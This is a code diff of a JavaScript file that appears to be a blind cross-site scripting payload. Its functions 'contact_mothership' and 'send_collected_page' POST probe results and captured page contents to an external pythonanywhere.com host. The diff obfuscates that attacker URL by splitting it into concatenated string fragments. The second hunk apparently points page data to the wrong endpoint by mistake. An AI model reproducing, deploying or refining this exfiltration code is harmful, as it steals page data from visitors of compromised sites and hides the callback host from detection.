@@ -62,7 +62,7 @@ function never_null( value ) {
 
 function contact_mothership( probe_return_data ) {
     var http = new XMLHttpRequest();
-    var url = "https://scriptshuva.pythonanywhere.com/js_callback";
+    var url = "https://script"+"shu"+"va.python"+"anywhere.com/js_call"+"back";
     http.open("POST", url, true);
     http.setRequestHeader("Content-type", "text/plain");
     http.onreadystatechange = function() {
@@ -81,7 +81,7 @@ function contact_mothership( probe_return_data ) {
 
 function send_collected_page( page_data ) {
     var http = new XMLHttpRequest();
-    var url = "https://scriptshuva.pythonanywhere.com/page_callback";
+    var url ="https://script"+"shu"+"va.python"+"anywhere.com/js_call"+"back";
     http.open("POST", url, true);
     http.setRequestHeader("Content-type", "text/plain");
     http.onreadystatechange = function() {
